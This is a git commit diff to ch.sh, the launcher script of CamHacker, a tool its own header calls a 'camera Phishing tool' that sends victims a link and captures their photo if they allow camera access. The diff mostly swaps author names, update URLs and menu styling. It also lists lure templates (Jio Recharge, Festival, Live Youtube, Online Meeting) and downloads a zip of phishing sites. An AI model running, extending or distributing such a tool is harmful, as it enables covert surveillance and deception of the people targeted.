8669a9ef10fcbe39d2a51dddacd2a7a9f16b70ae
MR-ZIHAD <103629879+MR-ZIHAD@users.noreply.github.com>
2022-12-06 22:14:13 +0600

    Update ch.sh

--- ch.sh
+++ ch.sh
@@ -1,10 +1,11 @@
 #!/bin/bash
 
 # CamHacker
-# Version    : 1.5
+# Version    : UPDATE
 # Description: CamHacker is a camera Phishing tool. Send a phishing link to victim, if he/she gives access to camera, his/her photo will be captured!
 # Author     : ZIHAD HOSSAIN RAFI
 # Github     : https://github.com/MR-ZIHAD
+# Email      : hossainzihad36@gmail.com
 # License    : MIT
 # Copyright  : MR-ZIHAD (2022-2023)
 # Language   : Shell
@@ -57,6 +58,12 @@ error="${yellow}[${white}!${yellow}] ${red}"
 success="${cyan}[${white}√${cyan}] ${green}"
 
 
+
+version="1.5"
+
+cwd=`pwd`
+tunneler_dir="$HOME/.tunneler"
+
 # Logo
 logo="
 ${green}  ____                _   _            _
@@ -67,7 +74,6 @@ ${yellow} \____\__,_|_| |_| |_|_| |_|\__,_|\___|_|\_\___|_|
 ${red}                                            [v${version}]
 ${blue}                                    [By KasRoudra]
 "
-
 ngrok_help="
 ${info}Steps: ${nc}
 ${blue}[1]${yellow} Go to ${green}https://ngrok.com
@@ -84,6 +90,12 @@ ${blue}[3]${yellow} Login to your account
 ${blue}[4]${yellow} Visit ${green}https://localxpose.io/dashboard/access${yellow} and copy your authtoken
 "
 
+# Check for sudo
+if command -v sudo > /dev/null 2>&1; then
+    sudo=true
+else
+    sudo=false
+fi
 
 # Check if mac or termux
 termux=false
@@ -379,14 +391,14 @@ if [[ -z $UPDATE ]]; then
     exit 1
 else
     if [[ $UPDATE == true ]]; then
-        git_ver=`curl -s -N https://raw.githubusercontent.com/MR-ZIHAD/CamHacker/main/files/version.txt`
+        git_ver=`curl -s -N https://raw.githubusercontent.com/KasRoudra/CamHacker/main/files/version.txt`
     else
         git_ver=$version
     fi
 fi
 
 if [[ "$git_ver" != "404: Not Found" && "$git_ver" != "$version" ]]; then
-    changelog=$(curl -s -N https://raw.githubusercontent.com/MR-ZIHAD/CamHacker/main/files/changelog.log)
+    changelog=$(curl -s -N https://raw.githubusercontent.com/KasRoudra/CamHacker/main/files/changelog.log)
     clear
     echo -e "$logo"
     echo -e "${info}CamHacker has a new update!\n${info}Current: ${red}${version}\n${info}Available: ${green}${git_ver}\n"
@@ -394,7 +406,7 @@ if [[ "$git_ver" != "404: Not Found" && "$git_ver" != "$version" ]]; then
         read upask
         printf "$nc"
         if [[ "$upask" == "y" ]]; then
-            cd .. && rm -rf CamHacker camhacker && git clone https://github.com/MR-ZIHAD/CamHacker
+            cd .. && rm -rf CamHacker camhacker && git clone https://github.com/KasRoudra/CamHacker
             echo -e "\n${success}CamHacker updated successfully!!"
             if [[ "$changelog" != "404: Not Found" ]]; then
                 echo -e "${purple}[•] Changelog:\n${blue}"
@@ -463,15 +475,15 @@ echo -e "$logo"
 sleep 1
 echo -e "${ask}Choose an option:
 
-${cyan}[${white}1${cyan}] ${yellow}Jio Recharge
-${cyan}[${white}2${cyan}] ${yellow}Festival
-${cyan}[${white}3${cyan}] ${yellow}Live Youtube
-${cyan}[${white}4${cyan}] ${yellow}Online Meeting
-${cyan}[${white}d${cyan}] ${yellow}Change Image Directory (current: ${red}${FOL}${yellow})
-${cyan}[${white}p${cyan}] ${yellow}Change Default Port (current: ${red}${PORT}${yellow})
-${cyan}[${white}x${cyan}] ${yellow}About
-${cyan}[${white}m${cyan}] ${yellow}More tools
-${cyan}[${white}0${cyan}] ${yellow}Exit${blue}
+${green}[${green}1${green}] ${green}JIO RECHARGE
+${green}[${green}2${green}] ${green}FESTIVAL
+${green}[${green}3${green}] ${green}LIVE YOUTUBE
+${green}[${green}4${green}] ${green}ONLINE MEETING
+${green}[${green}d${green}] ${green}CHANGE IMAGE DIRECTORY (current: ${green}${FOL}${green})
+${green}[${green}p${green}] ${green}CHANGE DEFAULT PORT (current: ${green}${PORT}${green})
+${green}[${green}x${green}] ${green}ABOUT
+${green}[${green}m${green}] ${green}MORE TOOLS
+${green}[${green}0${green}] ${green}EXIT${green}
 "
 sleep 1
 if [ -z $OPTION ]; then
@@ -538,14 +550,14 @@ fi
         echo -e "$red[ToolName]  ${cyan}  :[CamHacker]
 $red[Version]    ${cyan} :[${version}]
 $red[Description]${cyan} :[Camera Phishing tool]
-$red[Author]     ${cyan} :[MR-ZIHAD]
-$red[Github]     ${cyan} :[https://github.com/MR-ZIHAD]
-$red[Messenger]  ${cyan} :[https://m.me/zihad.hossain36]
-$red[Email]      ${cyan} :[hossainzihad36@gmail.com]"
+$red[Author]     ${cyan} :[KasRoudra]
+$red[Github]     ${cyan} :[https://github.com/KasRoudra]
+$red[Messenger]  ${cyan} :[https://m.me/KasRoudra]
+$red[Email]      ${cyan} :[kasroudrakrd@gmail.com]"
         printf "$ch_prompt"
         read about
     elif echo $option | grep -q "m"; then
-        xdg-open "https://github.com/MR-ZIHAD/MR-ZIHAD#My-Best-Works"
+        xdg-open "https://github.com/KasRoudra/KasRoudra#My-Best-Works"
     elif echo $option | grep -q "0"; then
         echo -e "\n${success}Thanks for using!\n"
         exit 0
@@ -570,7 +582,7 @@ fi
 if ! [ -d sites ]; then
     mkdir sites
     netcheck
-    wget -q --show-progress "https://github.com/MR-ZIHAD/CamHacker/releases/latest/download/websites.zip"
+    wget -q --show-progress "https://github.com/KasRoudra/CamHacker/releases/latest/download/websites.zip"
     unzip websites.zip -d sites > /dev/null 2>&1
     rm -rf websites.zip
 fi
